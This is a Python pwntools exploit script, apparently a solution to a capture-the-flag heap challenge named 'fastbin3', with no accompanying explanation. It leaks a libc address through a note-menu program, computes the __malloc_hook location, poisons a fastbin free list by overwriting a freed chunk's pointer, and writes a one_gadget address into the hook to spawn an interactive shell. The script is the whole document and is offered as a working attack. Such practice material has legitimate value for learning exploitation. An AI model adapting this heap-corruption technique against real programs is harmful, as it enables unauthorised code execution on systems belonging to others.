from pwn import *
p = process('./fastbin3', env = {"LD_PRELOAD":"./libc6_2.23-0ubuntu10_amd64.so"})
#gdb.attach(p)
table = p64(0x60201d)
#To add a note
atoi_got = p64(0x0000000000601ff0)

p.recvuntil('Enter choice >> ')
p.sendline('1')
p.recvuntil('Enter index :')
p.sendline('0')
p.recvuntil('Enter size: ')
p.sendline("130")
p.sendline("aaaaAAAA")

p.recvuntil('Enter choice >> ')
p.sendline('1')
p.recvuntil('Enter index :')
p.sendline('1')
p.recvuntil('Enter size: ')
p.sendline("120")
p.sendline("aaaaAAAA")

p.recvuntil('Enter choice >> ')
p.sendline('1')
p.recvuntil('Enter index :')
p.sendline('2')
p.recvuntil('Enter size: ')
p.sendline("120")
p.sendline("bbbbb")

p.recvuntil('Enter choice >> ')
p.sendline('4')
p.recvuntil('Enter index :')
p.sendline('0')

p.recvuntil('Enter choice >> ')
p.sendline('1')
p.recvuntil('Enter index :')
p.sendline('2')
p.recvuntil('Enter size: ')
p.sendline("0")

p.recvuntil('Enter choice >> ')
p.sendline('3')
p.recvuntil('Enter index :')
p.sendline('2')
p.recvuntil("Data: ")
leak = u64(p.recv().strip()+"\x00\x00")
print hex(leak)

libc_base = leak - 0x3c4bf8
malloc_hook = libc_base + 0x3c4b10

print hex(libc_base)
print hex(malloc_hook)
address = malloc_hook - 27 - 8
print hex(address)

p.recvuntil('Enter choice >> ')
p.sendline('4')
p.recvuntil('Enter index :')
p.sendline('1')

p.recvuntil('Enter choice >> ')
p.sendline('1')
p.recvuntil('Enter index :')
p.sendline('3')
p.recvuntil('Enter size: ')
p.sendline("100")
p.sendline("bbbbb")

p.recvuntil('Enter choice >> ')
p.sendline('1')
p.recvuntil('Enter index :')
p.sendline('4')
p.recvuntil('Enter size: ')
p.sendline("100")
p.sendline("bbbbb")

p.recvuntil('Enter choice >> ')
p.sendline('4')
p.recvuntil('Enter index :')
p.sendline('4')

p.recvuntil('Enter choice >> ')
p.sendline('4')
p.recvuntil('Enter index :')
p.sendline('3')


p.recvuntil('Enter choice >> ')
p.sendline('2')
p.recvuntil('Enter index :')
p.sendline('2')
exp = "a"*24 + p64(0x71) + p64(address)
p.sendline(exp)

p.recvuntil('Enter choice >> ')
p.sendline('1')
p.recvuntil('Enter index :')
p.sendline('3')
p.recvuntil('Enter size: ')
p.sendline("100")
p.sendline("bbbbb")

p.recvuntil('Enter choice >> ')
p.sendline('1')
p.recvuntil('Enter index :')
p.sendline('4')
p.recvuntil('Enter size: ')
p.sendline("100")
p.sendline("bbbbb")

one_gadget = libc_base + 0xf1147

p.recvuntil('Enter choice >> ')
p.sendline('2')
p.recvuntil('Enter index :')
p.sendline('4')
exp = "a"*19 + p64(one_gadget)
p.sendline(exp)

p.interactive()
